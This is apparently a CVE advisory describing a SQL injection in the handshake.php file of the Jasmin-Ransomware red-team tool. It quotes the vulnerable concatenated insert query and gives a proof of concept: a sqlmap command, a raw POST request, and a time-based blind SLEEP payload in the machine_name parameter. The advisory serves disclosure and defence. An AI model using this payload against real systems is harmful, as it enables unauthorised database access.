# CVE-2025-10387

SQLi vulnerability in Jasmin-Ransomware v1.0.1 of file /handshake.php with param machine_name

**vender**:

- Jasmin-Ransomware

**SoftLink**:

- [codesiddhant/Jasmin-Ransomware: Jasmin Ransomware is an advanced red team tool (WannaCry Clone) used for simulating real ransomware attacks. Jasmin helps security researchers to overcome the risk of external attacks.](https://github.com/codesiddhant/Jasmin-Ransomware)

**Vulnerable File**

- /handshake.php

**Version**

- V1.0.1

### Analyse

Vulnerability Overview

The `handshake.php` file contains a critical SQL injection vulnerability due to improper handling of user-supplied input in database queries.

Root Cause Analysis

1. **Direct Concatenation of User Input into SQL Query**

```php
$insert_user="insert into victims (machine_name,computer_user,os,date,time,ip,location,systemid,password) 
             VALUE ('$machine_name','$computer_user','$os','$date','$time','$ip','$location','$systemid','$password')";
```

All POST parameters (`$_POST['machine_name']`, `$_POST['computer_user']`, etc.) are directly embedded into the SQL statement without any validation, sanitization, or parameterization.

2. **Complete Lack of Input Validation**

The code fails to implement:
- Data type validation
- Input length restrictions
- Special character filtering
- SQL injection detection mechanisms
- Prepared statements with parameter binding

3. **Insecure Database Interaction**

While using `mysqli_query()`, the code doesn't utilize `mysqli_prepare()` with parameter binding, which is the recommended approach for preventing SQL injection.

### POC

```bash
sqlmap -r sqli.txt -p machine_name--technique T --batch
```



```http
POST /handshake.php HTTP/1.1
Host: 192.168.100.100
Content-Type: application/x-www-form-urlencoded
Content-Length: 156

handshake=jasmin@123&machine_name=test&computer_user=user&os=windows&date=2024-01-01&time=12:00:00&systemid=123&location=test&ip=127.0.0.1&password=pass
```



![image-20250830002416080](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508300024185.png)



```
Parameter: machine_name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: handshake=jasmin@123&machine_name=test'+(SELECT 0x64524772 WHERE 3822=3822 AND (SELECT 8032 FROM (SELECT(SLEEP(5)))GkSd))+'&computer_user=user&os=windows&date=2024-01-01&time=12:00:00&systemid=123&location=test&ip=127.0.0.1&password=pass
---
```

